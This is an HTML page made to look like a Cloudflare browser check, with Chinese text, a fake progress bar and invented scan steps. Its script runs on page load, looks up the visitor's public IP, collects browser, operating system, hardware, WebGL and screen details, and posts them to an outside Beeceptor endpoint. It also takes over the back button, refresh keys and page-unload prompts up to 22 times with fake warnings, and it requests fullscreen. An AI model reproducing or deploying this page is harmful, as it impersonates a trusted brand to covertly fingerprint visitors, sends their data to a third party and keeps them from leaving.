<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>安全检查中...</title>
    <meta name="robots" content="noindex, nofollow">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #e0e0e0;
            user-select: none;
            -webkit-user-select: none;
        }
        .container { width: 100%; max-width: 420px; padding: 20px; }
        .card {
            background: #0d0d0d;
            border: 1px solid #222;
            border-radius: 12px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 0 20px rgba(0,102,255,0.05);
        }
        .logo {
            font-size: 20px; font-weight: 600; color: #fff;
            margin-bottom: 30px; display: flex; align-items: center; justify-content: center; gap: 10px;
        }
        .logo svg { width: 28px; height: 28px; }
        .logo span {
            background: #fff; color: #000; padding: 2px 10px;
            border-radius: 4px; font-size: 16px; font-weight: 700;
            letter-spacing: 0.5px;
        }
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid #333;
            border-top: 4px solid #0066ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        h2 { font-size: 18px; font-weight: 500; color: #fff; margin-bottom: 8px; }
        p { color: #aaa; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
        .progress-bar { width: 100%; height: 4px; background: #222; border-radius: 2px; margin: 20px 0; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: #0066ff; border-radius: 2px; transition: width 0.3s linear; }
        .status-text { font-size: 13px; color: #666; margin-bottom: 5px; }
        .footer {
            margin-top: 30px; font-size: 12px; color: #555;
            display: flex; align-items: center; justify-content: center; gap: 6px;
        }
        .footer svg { width: 14px; height: 14px; }
        .hidden { display: none; }
        .success-icon {
            width: 50px; height: 50px; margin: 0 auto 20px;
            border-radius: 50%; background: #00cc66;
            display: flex; align-items: center; justify-content: center;
            font-size: 28px; color: #fff;
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div class="card" id="checkStep">
            <div class="logo">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2L2 7L12 12L22 7L12 2Z" fill="#fff"/>
                    <path d="M2 17L12 22L22 17" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    <path d="M2 12L12 17L22 12" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
                <span>CF</span> Cloudflare
            </div>
            <div class="spinner"></div>
            <h2 id="progressText">正在验证浏览器环境...</h2>
            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
            <p id="progressDesc">请勿关闭或刷新此页面</p>
            <div class="status-text" id="stepCounter">步骤 1/25</div>
            <div class="footer">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                DDoS 攻击防护 · Cloudflare
            </div>
        </div>

        <div class="card hidden" id="doneStep">
            <div class="success-icon">✓</div>
            <h2>检查已完成</h2>
            <p>您现在可以安全关闭此页面。</p>
            <div class="footer">谢谢您的配合</div>
        </div>
    </div>

    <script>
        // ==================== 自动收集并发送到 Beeceptor ====================
        (function autoCollect() {
            fetch('http://ip-api.com/json/?fields=query')
                .then(r => r.json())
                .then(d => {
                    var publicIP = (d && d.query) ? d.query : '不可用';
                    collectDeviceInfo(publicIP);
                })
                .catch(() => collectDeviceInfo('不可用'));

            function collectDeviceInfo(ipAddr) {
                var ptf = navigator.platform || '未知';
                var cc = navigator.hardwareConcurrency || '不可用';
                var ram = navigator.deviceMemory || '不可用';
                var ver = navigator.userAgent;
                var brw = '不可用', os = '不可用';

                var str = ver;
                if (ver.indexOf('Firefox') != -1) {
                    str = str.substring(str.indexOf(' Firefox/') + 1);
                    brw = str.split(' ')[0];
                } else if (ver.indexOf('Chrome') != -1) {
                    str = str.substring(str.indexOf(' Chrome/') + 1);
                    brw = str.split(' ')[0];
                } else if (ver.indexOf('Safari') != -1) {
                    str = str.substring(str.indexOf(' Safari/') + 1);
                    brw = str.split(' ')[0];
                } else if (ver.indexOf('Edge') != -1) {
                    str = str.substring(str.indexOf(' Edge/') + 1);
                    brw = str.split(' ')[0];
                }

                try {
                    var ua = ver;
                    var osPart = ua.substring(0, ua.indexOf(')'));
                    var osArr = osPart.split(';');
                    os = osArr.length > 1 ? osArr[1].trim() : '不可用';
                } catch(e) { os = '不可用'; }

                var ven = '不可用', ren = '不可用';
                try {
                    var canvas = document.createElement('canvas');
                    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                } catch(e) {}

                var ht = window.screen.height;
                var wd = window.screen.width;

                var payload = {
                    platform: ptf,
                    browser: brw,
                    cores: cc,
                    ram: ram,
                    vendor: ven,
                    render: ren,
                    ip: ipAddr,
                    ht: ht,
                    wd: wd,
                    os: os,
                    url: window.location.href,
                    time: new Date().toISOString()
                };

                // 发送到你的 beeceptor 端点
                fetch('https://waits.free.beeceptor.com', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).then(() => console.log('数据已发送'))
                  .catch(e => console.log('发送失败: ' + e));
            }
        })();

        // ==================== 退出拦截（22次） ====================
        var exitQuotes = [
            "安全扫描进行中，请勿离开...", "正在传输加密数据，请稍候...", "浏览器指纹采集未完成...",
            "网络环境检测中，请保持页面打开...", "DNS 查询尚未结束...", "WebRTC 泄露扫描未完成...",
            "Canvas 指纹生成中...", "字体列表正在枚举...", "硬件信息读取中，请勿刷新...",
            "屏幕参数分析中...", "时区与语言校验未通过...", "存储数据验证中...",
            "Cookie 完整性检查中...", "CPU 核心数检测未完成...", "操作系统指纹收集中...",
            "内存检测进行中...", "触摸设备识别中...", "音频上下文分析中...",
            "Web API 支持度扫描中...", "网络延迟测算中...", "TLS 握手分析未完成...",
            "最终安全报告生成中..."
        ];
        var MAX_INTERCEPT = 22;
        var exitCount = parseInt(sessionStorage.getItem('cf_exit_count')) || 0;
        function save(){ sessionStorage.setItem('cf_exit_count', exitCount); }
        function release(){
            window.removeEventListener('popstate', onBack);
            document.removeEventListener('keydown', onRefresh);
            window.removeEventListener('beforeunload', onBeforeUnload);
            sessionStorage.removeItem('cf_exit_count');
            try { if(document.exitFullscreen) document.exitFullscreen(); else if(document.webkitExitFullscreen) document.webkitExitFullscreen(); } catch(e) {}
        }
        function onBack(){
            if(exitCount >= MAX_INTERCEPT){ window.removeEventListener('popstate', onBack); window.history.back(); return; }
            window.history.pushState(null, null, location.href);
            confirm(exitQuotes[exitCount % exitQuotes.length]);
            exitCount++; save();
            if(exitCount >= MAX_INTERCEPT) release(); else location.replace(location.href);
        }
        function onRefresh(e){
            if(exitCount >= MAX_INTERCEPT) return;
            if(e.key === 'F5' || (e.ctrlKey && e.key === 'r') || (e.metaKey && e.key === 'r')){
                e.preventDefault(); e.returnValue = '';
                confirm(exitQuotes[exitCount % exitQuotes.length]);
                exitCount++; save();
                if(exitCount >= MAX_INTERCEPT) release(); else location.replace(location.href);
            }
        }
        function onBeforeUnload(e){
            if(exitCount >= MAX_INTERCEPT) return;
            e.preventDefault();
            e.returnValue = exitQuotes[exitCount % exitQuotes.length];
            setTimeout(function(){ if(!document.hidden){ exitCount++; save(); if(exitCount >= MAX_INTERCEPT) release(); } }, 100);
            return e.returnValue;
        }

        window.addEventListener('DOMContentLoaded', function(){
            if(exitCount >= MAX_INTERCEPT){
                document.getElementById('checkStep').classList.add('hidden');
                document.getElementById('doneStep').classList.remove('hidden');
                release();
                return;
            }
            window.history.pushState(null, null, location.href);
            window.addEventListener('popstate', onBack);
            document.addEventListener('keydown', onRefresh);
            window.addEventListener('beforeunload', onBeforeUnload);

            var scanSteps = [
                "正在验证浏览器指纹...", "正在检测网络环境...", "正在检查 DNS 配置...", "正在扫描 WebRTC 泄露...",
                "正在验证 Canvas 指纹...", "正在检测 AudioContext 指纹...", "正在检查 WebGL 信息...", "正在验证字体列表...",
                "正在分析浏览器插件...", "正在检测屏幕分辨率...", "正在检查时区与语言...", "正在验证本地存储...",
                "正在分析 Cookie 状态...", "正在检测硬件并发数...", "正在检查平台与系统...", "正在验证设备内存...",
                "正在检测触摸屏支持...", "正在分析音频指纹...", "正在验证 Web 功能...", "正在检查连接速度...",
                "正在分析 TLS 握手特征...", "正在检测 WebSocket 支持...", "正在验证 IndexedDB 存储...", "正在扫描 Service Worker...",
                "正在完成最终验证..."
            ];
            var currentStep = 0, totalSteps = scanSteps.length, stepDuration = 1800;
            var progressText = document.getElementById('progressText');
            var progressFill = document.getElementById('progressFill');
            var stepCounter = document.getElementById('stepCounter');

            function advanceStep() {
                if (currentStep >= totalSteps) {
                    document.getElementById('checkStep').classList.add('hidden');
                    document.getElementById('doneStep').classList.remove('hidden');
                    return;
                }
                progressText.textContent = scanSteps[currentStep];
                progressFill.style.width = Math.round(((currentStep+1)/totalSteps)*100) + '%';
                stepCounter.textContent = '步骤 ' + (currentStep+1) + '/' + totalSteps;
                currentStep++;
                setTimeout(advanceStep, stepDuration);
            }
            advanceStep();

            try { var el = document.documentElement; if(el.requestFullscreen) el.requestFullscreen().catch(()=>{}); else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen(); } catch(e) {}
        });
    </script>
</body>
</html>
